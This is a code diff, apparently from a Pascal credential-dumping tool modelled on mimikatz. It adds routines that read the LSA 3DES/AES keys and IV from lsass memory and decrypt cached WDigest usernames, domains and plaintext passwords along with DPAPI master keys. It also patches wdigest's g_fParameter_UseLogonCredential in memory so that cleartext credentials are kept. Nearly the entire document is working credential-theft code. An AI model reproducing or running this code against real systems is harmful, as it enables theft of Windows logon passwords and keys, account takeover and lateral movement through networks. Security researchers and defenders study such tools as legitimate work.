@@ -414,6 +414,7 @@ var
   len:ulong;
   buffer:array of byte;
 begin
+log('**** decryptLSA ****');
   log('length(decrypted):'+inttostr(length(decrypted)));
   //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
   if length(decrypted)>0 then for i:=0 to length(decrypted)-1 do decrypted[i]:=0;
@@ -450,10 +451,130 @@ begin
         //log('decrypted:'+ByteToHexaString  (decrypted ));
 end;
 
+function extractlsakeys(pid:dword;ivOffset,desOffset,aesOffset:int64;var DesKey,aeskey,iv:tbytes):boolean;
+var
+  hprocess:thandle;
+  keyPointer:nativeuint;
+  h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
+  extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
+  extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
+begin
+result:=false;
+//
+hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                      false,pid);
+//IV
+setlength(iv,16);
+ReadMem(hprocess, ivoffset, @iv[0], 16);
+log('IV:'+ByteToHexaString (IV));
+//
+// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
+if ReadMem(hprocess, desOffset, @keyPointer, sizeof(keyPointer))=false then writeln('readmem=false');
+// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
+if ReadMem(hprocess, keyPointer, @h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY))=false then writeln('readmem=false');
+log('TAG:'+strpas(h3DesKey.tag ));
+// Read in the 3DES key
+log('DES:');
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+   begin
+   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
+   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   setlength(DesKey ,extracted3DesKey81.hardkey.cbSecret);
+   copymemory(@DesKey [0],@extracted3DesKey81.hardkey.data[0],extracted3DesKey81.hardkey.cbSecret);
+   log('DESKey:'+ByteToHexaString(deskey));
+   end
+   else
+   begin
+   if ReadMem(hprocess, nativeuint(h3DesKey.key), @extracted3DesKey, sizeof(KIWI_BCRYPT_KEY))=false then writeln('readmem=false');
+   log('KIWI_BCRYPT_KEY:'+strpas(extracted3DesKey.tag ));
+   setlength(DesKey ,extracted3DesKey.hardkey.cbSecret);
+   copymemory(@DesKey [0],@extracted3DesKey.hardkey.data[0],extracted3DesKey.hardkey.cbSecret);
+   log('DESKey:'+ByteToHexaString(deskey));
+   end;
+//
+// Retrieve pointer to h3AesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
+ReadMem(hprocess, aesOffset, @keyPointer, sizeof(nativeuint));
+// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
+ReadMem(hprocess, keyPointer, @hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
+// Read in AES key
+log('AES:');
+if (winver='6.3.9600') or (copy(winver,1,3)='10.') then
+   begin
+   if ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey81, sizeof(KIWI_BCRYPT_KEY81))=false then writeln('readmem=false');
+   log('BCRYPT_KEY81TAG:'+strpas(extracted3DesKey81.tag ));
+   setlength(aesKey ,extractedAesKey81.hardkey.cbSecret);
+   copymemory(@aesKey [0],@extractedAesKey81.hardkey.data[0],extractedAesKey81.hardkey.cbSecret);
+   log('AESKey:'+ByteToHexaString(aesKey));
+   end
+   else
+   begin
+   ReadMem(hprocess, nativeuint(hAesKey.key), @extractedAesKey, sizeof(KIWI_BCRYPT_KEY));
+   log('BCRYPT_KEYTAG:'+strpas(extractedAesKey.tag ));
+   setlength(aesKey ,extractedAesKey.hardkey.cbSecret);
+   copymemory(@aesKey [0],@extractedAesKey.hardkey.data[0],extractedAesKey.hardkey.cbSecret);
+   log('AESKey:'+ByteToHexaString(aesKey));
+   end;
+//
+CloseHandle(hprocess);
+//
+result:=true;
+end;
+
+function findlsakeys_sym(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
+var
+  module:string='lsasrv.dll';
+  ivOffset,desOffset,aesOffset:int64;
+  hmod:thandle;
+begin
+result:=false;
+ivOffset:=0;desOffset:=0;aesOffset:=0;
+
+try
+       if _SymFromName (strpas(sysdir)+'\'+module,'InitializationVector',ivOffset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(ivOffset,sizeof(ivOffset)));
+             end
+             else log('_SymFromName:failed');
+       if _SymFromName (strpas(sysdir)+'\'+module,'h3DesKey',desOffset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(desOffset,sizeof(desOffset)));
+             end
+             else log('_SymFromName:failed');
+       if _SymFromName (strpas(sysdir)+'\'+module,'hAesKey',aesOffset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(aesOffset,sizeof(aesOffset)));
+             end
+             else log('_SymFromName:failed');
+       except
+       on e:exception do log(e.Message );
+       end;
+
+if (ivOffset=0) or (desOffset=0) or (aesOffset=0) then exit;
+
+//relative offset to virtual relative offset
+//might be easier to simply call loadlibrary and add base address to the relative offset...
+//rather than caller search_module_mem
+hmod:=LoadLibrary (pchar(module));
+ivoffset:=hmod+ivoffset;
+desOffset:=hmod+desOffset;
+aesOffset:=hmod+aesOffset;
+log('ivoffset:'+inttohex(ivoffset,sizeof(nativeint)));
+log('desOffset:'+inttohex(desOffset,sizeof(nativeint)));
+log('aesOffset:'+inttohex(aesOffset,sizeof(nativeint)));
+freelibrary(hmod);
+//
+result:=extractlsakeys (pid,ivOffset,desOffset ,aesOffset,deskey,aeskey,iv);
+
+
+end;
+
+//dd lsasrv!LsaInitializeProtectedMemory
 //dd lsasrv!h3DesKey
 //dd lsasrv!hAesKey
 //dd lsasrv!InitializationVector
-
 function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
 const
  //win7
@@ -463,8 +584,8 @@ const
  PTRN_WN10_LsaInitializeProtectedMemory_KEY:array[0..15] of byte=  ($83, $64, $24, $30, $00, $48, $8d, $45, $e0, $44, $8b, $4d, $d8, $48, $8d, $15);
  PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
 var
-  module:string='lsasrv.dll';
-pattern:array of byte;
+ module:string='lsasrv.dll';
+ pattern:array of byte;
  IV_OFFSET:ShortInt=0 ; //signed byte
  DES_OFFSET:ShortInt=0 ; //signed byte
  AES_OFFSET:ShortInt=0 ; //signed byte
@@ -478,7 +599,6 @@ pattern:array of byte;
  dummy:string;
  lsasrvMem:nativeuint;
  ivOffset,desOffset,aesOffset,keyPointer:nativeuint;
- iv_:tbyte16;
  h3DesKey, hAesKey:KIWI_BCRYPT_HANDLE_KEY;
  extracted3DesKey, extractedAesKey:KIWI_BCRYPT_KEY;
  extracted3DesKey81, extractedAesKey81:KIWI_BCRYPT_KEY81;
@@ -486,6 +606,8 @@ pattern:array of byte;
  i:byte;
 begin
   result:=false;
+  if symmode =true then begin result:=findlsakeys_sym (pid,DesKey ,aeskey ,iv);exit;end;
+  writeln('test');
   // OS detection
 if lowercase(osarch) ='x86' then
    begin
@@ -572,10 +694,9 @@ ivOffset:=keySigOffset + IV_OFFSET+ivOffset+4;
 {$endif CPU64}
 //will match dd lsasrv!InitializationVector
 log('IV_OFFSET:'+inttohex(ivOffset,sizeof(pointer)),0); //dd InitializationVector
-ReadMem(hprocess, ivoffset, @iv_, sizeof(iv_));
-log('IV:'+ByteToHexaString (IV_),0);
-setlength(iv,sizeof(iv_));
-CopyMemory(@iv[0],@iv_[0],sizeof(iv_));
+setlength(iv,16);
+ReadMem(hprocess, ivoffset, @iv[0], 16);
+log('IV:'+ByteToHexaString (IV),0);
 
 //keySigOffset:7FFEEE887696
 //target :     7ffeee94d998
@@ -799,6 +920,8 @@ if search_module_mem (pid,module,pattern,offset)=false then
    exit;
    end;
 //
+if offset=0 then exit;
+//
 hprocess:=thandle(-1);
 hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                       false,pid);
@@ -806,57 +929,57 @@ hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATI
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-                            if offset<>0 then
-                                 begin
-                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
-                                 //
 
-                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
-                                 begin
-                                      CopyMemory(@offset_list_dword,@offset_list[0],4);
-                                      log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
-                                      //new offset to the list entry
-                                      {$ifdef CPU64}
-                                      offset:= offset+offset_list_dword+4+patch_pos;
-                                      {$endif CPU64}
-                                      {$ifdef CPU32}
-                                      offset:= offset_list_dword{+patch_pos};
-                                      {$endif CPU32}
-                                      log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
-                                      //
-                                      //read sesslist at offset
-                                      ZeroMemory(@list[0],sizeof(list));
-                                      ReadMem  (hprocess,offset,list );
-                                      //lets skip the first one
-                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
-                                      bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
-                                      log('*****************************************************',1);
-                                      if bret then
-                                      while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
-                                      begin
-                                      //
-                                      log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).LogonId.LowPart,4) ,1) ;
-                                      log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).KeyUid),1) ;
-                                      FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).insertTime,localft) ;
-                                      FileTimeToSystemTime(localft, st );
-                                      log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
-                                      setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize);
-                                      if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).key ,decrypted)=false
-                                      then log('decryptLSA NOT OK',1)
-                                      else
-                                      begin
-                                      log('MasterKey:'+ByteToHexaString(decrypted),1);
-                                      if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize, dgst, SHA_DIGEST_LENGTH )
-                                         then log('SHA1:'+ByteToHexaString (dgst),1);
-                                      end;
-                                      //next logsesslist
-                                      current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
-                                      ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
-                                      log('*****************************************************',1)
-                                      end;//while
-                                 end; //if readmem
+               log('found:'+inttohex(offset,sizeof(pointer)),0);
+               //
 
-                                 end; //if offset<>0
+               if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+               begin
+                    CopyMemory(@offset_list_dword,@offset_list[0],4);
+                    log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+                    //new offset to the list entry
+                    {$ifdef CPU64}
+                    offset:= offset+offset_list_dword+4+patch_pos;
+                    {$endif CPU64}
+                    {$ifdef CPU32}
+                    offset:= offset_list_dword{+patch_pos};
+                    {$endif CPU32}
+                    //dd dpapisrv!g_MasterKeyCacheList
+                    log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+                    //
+                    //read sesslist at offset
+                    ZeroMemory(@list[0],sizeof(list));
+                    ReadMem  (hprocess,offset,list );
+                    //lets skip the first one
+                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                    bret:=ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                    log('*****************************************************',1);
+                    if bret then
+                    while PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink<>offset do
+                    begin
+                    //
+                    log('LUID:'+inttohex(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).LogonId.LowPart,4) ,1) ;
+                    log('GUID:'+GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).KeyUid),1) ;
+                    FileTimeToLocalFileTime (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).insertTime,localft) ;
+                    FileTimeToSystemTime(localft, st );
+                    log('Time:'+DateTimeToStr (SystemTimeToDateTime (st)),1);
+                    setlength(decrypted,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize);
+                    if decryptLSA (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize ,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).key ,decrypted)=false
+                    then log('decryptLSA NOT OK',1)
+                    else
+                    begin
+                    log('MasterKey:'+ByteToHexaString(decrypted),1);
+                    if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0]).keySize, dgst, SHA_DIGEST_LENGTH )
+                       then log('SHA1:'+ByteToHexaString (dgst),1);
+                    end;
+                    //next logsesslist
+                    current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink);
+                    ReadMem  (hprocess,PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] ).flink,list );
+                    log('*****************************************************',1)
+                    end;//while
+               end; //if readmem
+
+
        closehandle(hprocess);
        end;//if openprocess...
 end;
@@ -934,17 +1057,17 @@ result:=false;
      //patch_pos:=-1;
      //offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
      //log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
-     try
-     if _SymFromName (strpas(sysdir)+'\wdigest.dll','g_fParameter_UseLogonCredential',offset)
-        then
-           begin
-           log('_SymFromName:'+inttohex(offset,sizeof(offset)));
-           patch_pos:=-1;
-           end
-        else log('_SymFromName:failed');
-     except
-     on e:exception do log(e.Message );
-     end;
+       try
+       if _SymFromName (strpas(sysdir)+'\'+module,'g_fParameter_UseLogonCredential',offset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
+             patch_pos:=-1;
+             end
+          else log('_SymFromName:failed');
+       except
+       on e:exception do log(e.Message );
+       end;
      end;
 
   if patch_pos =0 then
@@ -960,8 +1083,9 @@ result:=false;
      exit;
      end;
   //
-  if offset<>0 then
-    begin
+  if offset=0 then exit;
+  //
+
     log('found:'+inttohex(offset,sizeof(pointer)),0);
     //
     hprocess:=thandle(-1);
@@ -973,14 +1097,7 @@ result:=false;
 
     if patch_pos =-1 then //relative offset was provided
         begin
-        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
-        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
-        //dw:=1;
-        ReadMem (hprocess,offset,@dw,4);
-        log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
-        dw:=ByteSwap32 (1);
-        writemem(hprocess,offset,@dw,4);
-        result:=true;
+        //nothing to do here...
         end;
 
     if patch_pos <>-1 then  //some more work to find the relative offset
@@ -989,19 +1106,21 @@ result:=false;
         //CopyMemory(@offset_dword,@offset_byte[0],4);
         log('ReadProcessMemory OK '+inttohex(offset_dword,4));
         offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
-        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
+        end; //if readmem
+
+        //finally do the work
         //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
+        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
         //dw:=1;
         ReadMem (hprocess,offset,@dw,4);
         log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
         dw:=ByteSwap32 (1);
         writemem(hprocess,offset,@dw,4);
         result:=true;
-        end; //if readmem
 
     closehandle(hprocess);
     end;
-    end; //if offset<>0 then
+
 
 end;
 
@@ -1078,14 +1197,21 @@ begin
           patch_pos:=-6;
      end;
 
-  {
-  if lowercase(getenv('l_LogSessList'))<>'' then
+
+  if symmode=true then
      begin
-     patch_pos:=-1;
-     offset:=int64(strtoint('$'+getenv('l_LogSessList')));
-     log('env l_LogSessList:'+inttohex(offset,sizeof(offset)));
+       try
+       if _SymFromName (strpas(sysdir)+'\'+module,'l_LogSessList',offset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
+             patch_pos:=-1;
+             end
+          else log('_SymFromName:failed');
+       except
+       on e:exception do log(e.Message );
+       end;
      end;
-  }
 
   if patch_pos =0 then
      begin
@@ -1099,78 +1225,89 @@ begin
      log('search_module_mem NOT OK');
      exit;
      end;
+   //
+  if offset=0 then exit;
   //
+  log('found:'+inttohex(offset,sizeof(pointer)),0);
+
   hprocess:=thandle(-1);
   hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                         false,pid);
   if hprocess<>thandle(-1) then
        begin
        log('openprocess ok',0);
-                            if offset<>0 then
-                                 begin
-                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
-                                 //
-                                 if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
-                                   begin
-                                   //CopyMemory(@offset_list_dword,@offset_list[0],4);
-                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
-                                   //we now should get a match with .load wdigest.dll then dd wdigest!l_LogSessList
-                                   //new offset to the list entry
-                                   {$ifdef CPU64}
-                                   offset:= offset+offset_list_dword+4+patch_pos;
-                                   {$endif CPU64}
-                                   {$ifdef CPU32}
-                                   offset:= offset_list_dword{+patch_pos};
-                                   {$endif CPU32}
-                                   log('offset l_LogSessList:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
-                                   //read sesslist at offset
-                                   ReadMem  (hprocess,offset,logsesslist );
-                                   dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
-                                   //lets skip the first one
-                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
-                                   //lets loop
-                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
-                                   //while dummy<>inttohex(offset,sizeof(pointer)) do
-                                   while i_logsesslist (logsesslist).next<>offset do
-                                   begin
-                                   log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
-                                   log('entry#next:'+dummy,0) ;
-                                   log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
-                                   //get username
-                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes )
-                                   //copymemory(@username[0],@bytes[0],64);
-                                      then log('username:'+strpas (pwidechar(@bytes[0])),1);
-                                   //get domain
-                                   if ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes )
-                                   //copymemory(@domain[0],@bytes[0],64);
-                                      then log('domain:'+strpas (pwidechar(@bytes[0])),1);
-                                   //
-                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
-                                   if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
-                                     begin
-                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
-                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
-                                     setlength(decrypted,1024);
-                                     if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
-                                        then log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
-                                     end;
-                                   //decryptcreds;
-                                   //next
-                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
-                                   dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
-                                   end;
-                                   //...
 
-                                   end; //if readmem
-                                 end;  //if offset<>0 then
-                            {//test - lets read first 4 bytes of our module
-                             //can be verified with process hacker
-                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
-                               begin
-                               log('ReadProcessMemory OK');
-                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
-                               end;
-                            }
+       if patch_pos =-1 then //relative offset was provided
+       begin
+       //nothing to do here...
+       end;
+
+       //
+       if patch_pos <>-1 then  //some more work to find the relative offset
+       if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
+       begin
+       //CopyMemory(@offset_list_dword,@offset_list[0],4);
+       log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
+       //we now should get a match with .load wdigest.dll then dd wdigest!l_LogSessList
+       //new offset to the list entry
+       {$ifdef CPU64}
+       offset:= offset+offset_list_dword+4+patch_pos;
+       {$endif CPU64}
+       {$ifdef CPU32}
+       offset:= offset_list_dword{+patch_pos};
+       {$endif CPU32}
+       end; //if readmem
+
+               //finally do the work
+               log('offset l_LogSessList:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
+               //read sesslist at offset
+               ReadMem  (hprocess,offset,logsesslist );
+               dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
+               //lets skip the first one
+               ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
+               //lets loop
+               //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
+               //while dummy<>inttohex(offset,sizeof(pointer)) do
+               while i_logsesslist (logsesslist).next<>offset do
+               begin
+               log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+               log('entry#next:'+dummy,0) ;
+               log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
+               //get username
+               if ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes )
+               //copymemory(@username[0],@bytes[0],64);
+                  then log('username:'+strpas (pwidechar(@bytes[0])),1);
+               //get domain
+               if ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes )
+               //copymemory(@domain[0],@bytes[0],64);
+                  then log('domain:'+strpas (pwidechar(@bytes[0])),1);
+               //
+               log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
+               if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
+                 begin
+                 setlength(password,i_logsesslist (logsesslist ).maxlen3);
+                 ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
+                 setlength(decrypted,1024);
+                 if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
+                    then log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
+                 end;
+               //decryptcreds;
+               //next
+               ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
+               dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
+               end; //while
+               //
+
+
+
+                {//test - lets read first 4 bytes of our module
+                 //can be verified with process hacker
+                if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
+                   begin
+                   log('ReadProcessMemory OK');
+                   log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
+                   end;
+                }
 
        closehandle(hprocess);
        end;//if openprocess...
